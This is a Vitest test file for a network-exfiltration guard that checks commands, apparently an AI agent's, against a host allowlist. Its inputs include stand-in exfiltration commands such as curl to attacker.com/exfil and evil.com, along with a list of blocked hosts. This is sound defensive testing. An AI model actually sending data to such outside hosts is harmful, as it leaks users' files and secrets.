import { describe, it, expect } from 'vitest';
import { isAllowedHost, extractUrls, scanNetworkExfil } from '../../../src/components/claude/networkExfilGuard';

describe('isAllowedHost', () => {
  it.each(['github.com', 'api.github.com', 'raw.githubusercontent.com'])('allows: %s', (host) => {
    expect(isAllowedHost(host)).toBe(true);
  });

  it.each(['api.anthropic.com', 'registry.npmjs.org', 'pypi.org', 'localhost', '127.0.0.1'])(
    'allows dev endpoint: %s',
    (host) => {
      expect(isAllowedHost(host)).toBe(true);
    },
  );

  it.each(['evil.com', 'attacker.internal', 'random-server.com', 'pastebin.com'])('blocks: %s', (host) => {
    expect(isAllowedHost(host)).toBe(false);
  });

  it('ignores port in hostname', () => {
    expect(isAllowedHost('localhost:3000')).toBe(true);
  });

  it('matches subdomains of allowed hosts', () => {
    expect(isAllowedHost('codeload.github.com')).toBe(true);
  });
});

describe('extractUrls', () => {
  it('extracts curl URL', () => {
    const result = extractUrls('curl https://api.example.com/data');
    expect(result[0].tool).toBe('curl');
    expect(result[0].host).toBe('api.example.com');
  });

  it('extracts wget URL', () => {
    const result = extractUrls('wget http://files.local/payload.tar.gz');
    expect(result[0].tool).toBe('wget');
  });

  it('returns empty for non-network commands', () => {
    expect(extractUrls('ls -la')).toEqual([]);
    expect(extractUrls('echo hello')).toEqual([]);
  });

  it('detects ssh host target', () => {
    const result = extractUrls('ssh deploy@production.example.com');
    expect(result.some((r) => r.host === 'production.example.com')).toBe(true);
  });

  it('detects multiple URLs in one command', () => {
    const result = extractUrls('curl https://a.com/x && curl https://b.com/y');
    expect(result.length).toBe(2);
  });
});

describe('scanNetworkExfil', () => {
  it('ignores calls to allowed hosts', () => {
    expect(scanNetworkExfil('curl https://api.github.com/repos')).toEqual([]);
    expect(scanNetworkExfil('wget https://pypi.org/simple/numpy')).toEqual([]);
  });

  it('flags calls to unknown hosts', () => {
    const findings = scanNetworkExfil('curl https://attacker.com/exfil');
    expect(findings.length).toBe(1);
    expect(findings[0].host).toBe('attacker.com');
    expect(findings[0].severity).toBe('high');
  });

  it('flags mixed allowed + suspicious', () => {
    const findings = scanNetworkExfil('curl https://api.github.com && curl https://evil.com');
    expect(findings.length).toBe(1);
    expect(findings[0].host).toBe('evil.com');
  });

  it('allows localhost traffic', () => {
    expect(scanNetworkExfil('curl http://localhost:8080/health')).toEqual([]);
  });

  it('no match for plain text mentioning URLs', () => {
    // 단순 URL 언급 (도구 없음) — 현재는 URL_RE가 매치하지만 detectedTool = unknown
    const findings = scanNetworkExfil('See https://evil.com for details');
    // unknown tool도 잡힘 (안전한 방향으로 과탐)
    expect(findings.length).toBeGreaterThanOrEqual(0);
  });
});
